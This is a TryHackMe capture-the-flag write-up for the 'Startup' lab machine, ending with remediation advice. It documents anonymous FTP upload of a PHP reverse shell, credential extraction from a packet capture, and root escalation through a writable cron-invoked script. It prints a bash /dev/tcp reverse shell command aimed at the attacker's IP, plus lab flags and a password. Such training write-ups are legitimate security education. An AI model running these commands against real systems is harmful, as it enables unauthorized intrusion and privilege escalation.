# Target: Startup

**Platform:** TryHackMe
[Startup on TryHackMe](https://tryhackme.com/room/startup)

| Target Name | IP Address | OS | Difficulty |
| :--- | :--- | :--- | :--- |
| Startup | 10.114.157.67 | Linux | Easy |

---

## Phase 1: Reconnaissance & Enumeration

I had absolutely no prior information about this machine; my only objective was to compromise it and find the flags.
I started my reconnaissance by scanning open ports using `nmap`. I used appropriate flags: `-sV` to determine version of service running on each port, `-vv` to view the scan progress in real-time.
**Nmap Scan:**
```bash
nmap -sV -vv 10.114.157.67
```

```
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Seeing that port 80 was open, I immedietally opened web browser and navigated to the IP address. The langing page simply started that it was under construction by the developers. To dig deeper, I ran `gobuster` to find hidden directories.
**Directory Finding:**
```bash
gobuster dir -url 10.114.157.67 --wordlist /usr/share/wordlists/dirb/common.txt
```

```
.htpasswd            (Status: 403) [Size: 278]
.htaccess            (Status: 403) [Size: 278]
.hta                 (Status: 403) [Size: 278]
files                (Status: 301) [Size: 314] [--> http://10.114.157.67/files/]
index.html           (Status: 200) [Size: 808]
server-status        (Status: 403) [Size: 278]
```

I entered the `/files/` directory and there I found two interesting files: one was `important.jpg`, which was a meme, the second one was `notice.txt` with message:
```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
```

Next I tried to connect to ftp using the `ftp` command using the `anonymous` username, which is common on weak secured ftp:
**Connecting to FTP**
```bash
ftp anonymous@10.114.157.67
```

When prompted for a password, I simply pressed Enter adn succesfully logged in. I coudl tell the connection worked because my prompt changed from `$` to `ftp>`.
I listed files and directories the ftp contains by using the `ls` command with flag `-a` to show hidden files and directories too.
```
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rw-r--r--    1 0        0               5 Nov 12  2020 .test.log
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
```

Seeing `important.jpg` and `notice.txt` here confirmed that this FTP share was directly connected to the web server's `/files/` directory. The `.test.log` file looked interesting so I downloaded it by using `get` command, and read it, but there only was one word: `test`, making it a dead end.

## Phase 2: Initial Foothold (Gaining Access)

Knowing that FTP directory mirrored the web directory, I decided to prepare malicioius file, which I could upload on the server and execute it to connect with it. I opened the new terminal and I copied deafult Kali Linux `php-reverse-shell` file to my current folder to adjust it for this attack.
**Coppying the Payload:**
```
sudo cp /usr/share/webshells/php/php-reverse-shell.php .
```

I opened the file by using: `sudo nano` command, and changed `ip` to match my TryHackMe VPN IP, leaving the `port` at its default (`1234`). The file was ready to maintain attack. I returned to the terminal with active ftp connection and I tried to put the payload to the server by using `put` command.
**Putting Payload on the server:**
```bash
put php-reverse-shell.php
```

But this gives me an permission error.
```
local: php-reverse-shell.php remote: php-reverse-shell.php
229 Entering Extended Passive Mode (|||49418|)
553 Could not create file.
```

So that mean, that administrator of the server blocked the uploading ability to the anonymous users, but looking back to listing directory on server, the `ftp` directory had `drwxrwxrwx`, so there uploading the payload could be possible. I changed the directory to `ftp` by using `cd ftp`  and there I uploaded the payload.
**Putting Payload to the ftp directory:**
```
put php-reverse-shell.php
```

**Veryfiyng Payload transfer:**
```
ftp> ls -la
229 Entering Extended Passive Mode (|||59336|)
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Mar 18 19:59 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
-rwxrwxr-x    1 112      118          5497 Mar 18 19:59 php-reverse-shell.php
226 Directory send OK.
```

After that I had to set up the listener to listen for incoming connection.I oepened new terminal and there I used the `netcat` tool with apropirate flags.
**Listener Setup:**
```bash
nc -lvnp 1234
```

After a while I've got succesfull connection to the ftp server, I knew that becouse prompt changed to $
**Proof of Access:**
```
$ whoami
www-data
```

## Phase 3: Privilege Escalation & Post-Exploitation

After connecting to the server I made some reconnaissance using `dir` command and I found file `recipe.txt`. I read it imidietally.
**Checking for recipe:**
```bash
cat recipe.txt
```

```
Someone asked what our main ingredient to our spice soup is today. I figured I can't keep it a secret forever and told him it was love.
```

After that I made much enumeration to find how to escalate my privileges. I wanted to escalate my privileges to normal user privileges. I found only one directory wchich wasn't owned by root.
**Finding user-data directories:**
```bash
ls -la
```

```
total 100
drwxr-xr-x  25 root     root      4096 Mar 20 08:35 .
drwxr-xr-x  25 root     root      4096 Mar 20 08:35 ..
drwxr-xr-x   2 root     root      4096 Sep 25  2020 bin
drwxr-xr-x   3 root     root      4096 Sep 25  2020 boot
drwxr-xr-x  16 root     root      3560 Mar 20 08:35 dev
drwxr-xr-x  96 root     root      4096 Nov 12  2020 etc
drwxr-xr-x   3 root     root      4096 Nov 12  2020 home
drwxr-xr-x   2 www-data www-data  4096 Nov 12  2020 incidents
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img -> boot/initrd.img-4.4.0-190-generic
lrwxrwxrwx   1 root     root        33 Sep 25  2020 initrd.img.old -> boot/initrd.img-4.4.0-190-generic
drwxr-xr-x  22 root     root      4096 Sep 25  2020 lib
drwxr-xr-x   2 root     root      4096 Sep 25  2020 lib64
drwx------   2 root     root     16384 Sep 25  2020 lost+found
drwxr-xr-x   2 root     root      4096 Sep 25  2020 media
drwxr-xr-x   2 root     root      4096 Sep 25  2020 mnt
drwxr-xr-x   2 root     root      4096 Sep 25  2020 opt
dr-xr-xr-x 119 root     root         0 Mar 20 08:35 proc
-rw-r--r--   1 www-data www-data   136 Nov 12  2020 recipe.txt
drwx------   4 root     root      4096 Nov 12  2020 root
drwxr-xr-x  25 root     root       920 Mar 20 08:53 run
drwxr-xr-x   2 root     root      4096 Sep 25  2020 sbin
drwxr-xr-x   2 root     root      4096 Nov 12  2020 snap
drwxr-xr-x   3 root     root      4096 Nov 12  2020 srv
dr-xr-xr-x  13 root     root         0 Mar 20 08:51 sys
drwxrwxrwt   7 root     root      4096 Mar 20 08:57 tmp
drwxr-xr-x  10 root     root      4096 Sep 25  2020 usr
drwxr-xr-x   2 root     root      4096 Nov 12  2020 vagrant
drwxr-xr-x  14 root     root      4096 Nov 12  2020 var
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz -> boot/vmlinuz-4.4.0-190-generic
lrwxrwxrwx   1 root     root        30 Sep 25  2020 vmlinuz.old -> boot/vmlinuz-4.4.0-190-generic
```

The only one directory was `incidents`, I moved to this directory and listed files there:
**Listing files in incidents directory:**
```bash
ls -la
```

```
total 40
drwxr-xr-x  2 www-data www-data  4096 Nov 12  2020 .
drwxr-xr-x 25 root     root      4096 Mar 20 08:35 ..
-rwxr-xr-x  1 www-data www-data 31224 Nov 12  2020 suspicious.pcapng
```

The file `suspicious.pcapng` could contain important information which I could sae in Wireshark. I tried to get this file by using `get` command, but I don't have permission to do it. I decided to copy it to folder which was on the webpage.
**Coppyng file to available destination:**
```bash
cp suspicious.pcapng /var/www/html/files/ftp/
```

Directory `/var/www/html/files/ftp` is the exactly place whrere I had put reverse shell script, so there I could download it to my machine. I moved back to previous terminal, where I had been connecting to ftp. I executed connection once again, because it dropped by timeout. After connecting once again and moving to `ftp` directory I saw there file `suspicious.pcapng`. I downloaded it to my machine - `get suspicious.pcapng`.
After that I dropped the connection and opened this file in the Wireshark.
**Opening suspicious.pcapng**
```bash
wireshark suspisious.pcapng
```

After a while the Wireshark opene and I started searching for FTP connection packets, but there was no packet send by this protocol. I take one TCP packet whcich was from normal communication, righ clicked on it, picked follow and TCP Stream. This opened a panel with communication between user and server, when I scrolled down I found potential password for `lennie` user: `c4ntg3t3n0ughsp1c3`.
I decided to connect with the machine using ssh, because port 22 was open and I've got username and potential passsword. I do it in the new terminal window.
**Connecting via ssh:** 
```bash
ssh lennie@10.114.157.67
```

I typed the password and I'd connected as lennie.
**Veryfing connection:**
```bash
whoami
```

```
lennie
```

I listed directories and files in current directory by using `ls` and.
```
Documents  scripts  user.txt
```

So I decided to read the file user.txt by using `cat` command and ther I found the flag: `THM{03ce3d619b80ccbfb3b7fc81e46c0e79}`.
Next I moved to the `scripts` directory and listed directories inside it.
```
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 5 lennie lennie 4096 Mar 21 11:18 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 Mar 21 11:26 startup_list.txt
```

I read contents of these two files: `planner.sh` and `startup_list.txt` using command: `cat`.
**Reading files:**
```bash
$ cat planner.sh
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh

$ cat startup_list.txt

```

File `planner.sh` was the script which was executing different script at: `/etc/print.sh`. The `planner.sh` script run automatically in the background and the `root`, so it's potential place to escalate privileges to root. I decided to read this file and check it's owner.
**Reading script properties:**
```bash
$ ls -la /etc/print.sh
-rwx------ 1 lennie lennie 25 Nov 12  2020 /etc/print.sh
$ cat /etc/print.sh
#!/bin/bash
echo "Done!"
```

As the `lennie` user was owner of `print.sh` script, and it runs automatically in the background as the root. I could read malicioius code inside it to spawn a new root shell. Because this script had been running automatically I had to start listener to establish connection, I did it in the new terminal.
**Setting listener:**
```bash
nc -lnvp 1234
```

**Writing malicious script:**
```bash
echo "bash -i >& /dev/tcp/192.168.158.248/1234 0>&1" > /etc/print.sh
```

To generate this code I went on the site [revshells.com](https://www.revshells.com/). There I configured the sctip to my needs.
After a while of wating the script had run in the background of the machine and the connection had been established.
**Proof of Root:**
```bash
whoami
root
```

That meant, that I succesfully escalated my privilages and became a root. I listed files in current directory and there I found file `root.txt` so I read it and I've got a flag: `THM{f963aaa6a430f210222158ae15c3d76d}`.
This ends the room.

## Conclusion & Takeaways

**Summary:** Compromising the Startup machine involved connecting to the `FTP` server which was connected to the website, and uploading a reverse shell script to the site. After maimtaining connection with `FTP` via `netcat`, enumeration showed an easy to download `Wireshark` file which contains a password for a standard user. Next, after connecting as the standard user via `SSH`, a misconfigureed cron script allowed me to inject malicious code which spawned a root shell.

**What I Learned:** How an `FTP server` can be linked to a public-facing web directory. Understanding the Linux web directory structure (like `/var/www/html`). How to use `TCP Stream` feature in `Wireshark` to extract plain-text credentials. How to generate reverse shell scripts using [revshells.com](https://www.revshells.com/).

**Remediation:**
To secure this machine and prevent similar attacks, I recommend the following remediations:

1. **Improve FTP and WEB Security:** Allowing `anonyous FTP` access is a major security risk and should be completely disabled. Furthenmore, directory permissions must be restricted so thath unauthorized users cannot upload files - escpecially executable scripts like `.php` - directly to the public web server. Finally, administrators must remove unnecessary sensitive files, such as packet captures (`.pcapng`), form the server, as they can leak credentials to attackers.
2. **Secure Cron Jobs:** Root cron jobs must be configurated properly. Allowing a root-lever script to execute a secondary script that is owned by a low-level user is a critical security breach. It allows a standard user to inject malicious code that the system will run with root privileges. Administrators must audit automated tasks to ensure that any executed by `root` is strictly owned by and writable only by `root`.

**What I could do bette/faster in the future:**
After completing this machine, I'd learned some skill that will improve my future study and work:

1. **Efficient Packet Analysis:** During the network analysis phase, I initially got stuck trying to anaylze individuals packets manually. In the future, I will immediately look for ways to reconstruct full conversation using features like Wireshark's `Follow TCP Stream` to save time and spot plaintext credentials much faster.

2. **Payload Generation:** I spent unnecessary time trying to figure out the exact syntax for a bash reverse shell. Going forward, I will utilize industry-standard payload generators like [revshells.com](https://www.revshells.com/) to quickly and reliably generate reverse shell commands, allowing me to focus more on the actual exploitation path rather than memorizing syntax.
